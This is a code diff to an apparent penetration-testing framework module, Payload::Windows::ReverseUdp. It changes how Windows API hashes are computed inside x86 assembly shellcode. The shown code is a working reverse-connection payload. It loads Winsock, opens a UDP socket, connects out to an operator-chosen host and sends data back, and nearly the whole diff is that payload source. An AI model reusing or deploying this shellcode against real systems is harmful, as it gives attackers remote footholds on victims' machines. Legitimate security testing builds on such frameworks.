@@ -75,14 +75,14 @@ module Payload::Windows::ReverseUdp
         push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
         push 'ws2_'             ; ...
         push esp                ; Push a pointer to the "ws2_32" string on the stack.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+        push #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp                ; LoadLibraryA( "ws2_32" )
 
         mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
         sub esp, eax            ; alloc some space for the WSAData structure
         push esp                ; push a pointer to this struct
         push eax                ; push the wVersionRequested parameter
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
+        push #{block_api_hash('ws2_32.dll', 'WSAStartup')}
         call ebp                ; WSAStartup( 0x0190, &WSAData );
 
       set_address:
@@ -101,7 +101,7 @@ module Payload::Windows::ReverseUdp
         inc eax                 ;
         push eax                ; push SOCK_DGRAM (UDP socket)
         push eax                ; push AF_INET
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
+        push #{block_api_hash('ws2_32.dll', 'WSASocketA')}
         call ebp                ; WSASocketA( AF_INET, SOCK_DGRAM, 0, 0, 0, 0 );
         xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
 
@@ -109,7 +109,7 @@ module Payload::Windows::ReverseUdp
         push 16                 ; length of the sockaddr struct
         push esi                ; pointer to the sockaddr struct
         push edi                ; the socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
+        push #{block_api_hash('ws2_32.dll', 'connect')}
         call ebp                ; connect( s, &sockaddr, 16 );
 
         test eax,eax            ; non-zero means a failure
@@ -129,7 +129,7 @@ module Payload::Windows::ReverseUdp
     else
       asm << %Q^
       failure:
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        push #{block_api_hash('kernel32.dll', 'ExitProcess')}
         call ebp
       ^
     end
@@ -160,7 +160,7 @@ module Payload::Windows::ReverseUdp
         db #{newline}          ; newline
       get_nl_address:
         push edi               ; saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
+        push #{block_api_hash('ws2_32.dll', 'send')}
         call ebp               ; call send
     ^
     asm
